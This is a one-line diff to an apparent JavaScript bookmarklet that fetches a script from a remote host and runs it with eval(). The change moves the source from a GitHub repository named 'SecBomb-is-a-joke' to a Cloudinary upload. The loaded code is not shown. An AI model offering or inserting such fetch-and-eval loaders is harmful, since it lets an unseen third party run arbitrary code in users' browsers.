@@ -1,1 +1,1 @@
-javascript:fetch("https://raw.githubusercontent.com/zek-c/SecBomb-is-a-joke/main/fun.js").then(r => r.text()).then(r => eval(r))
+javascript:fetch("https://res.cloudinary.com/dxttxbdrd/raw/upload/v1681925744/funnny_vnbomi.js").then(r => r.text()).then(r => eval(r))
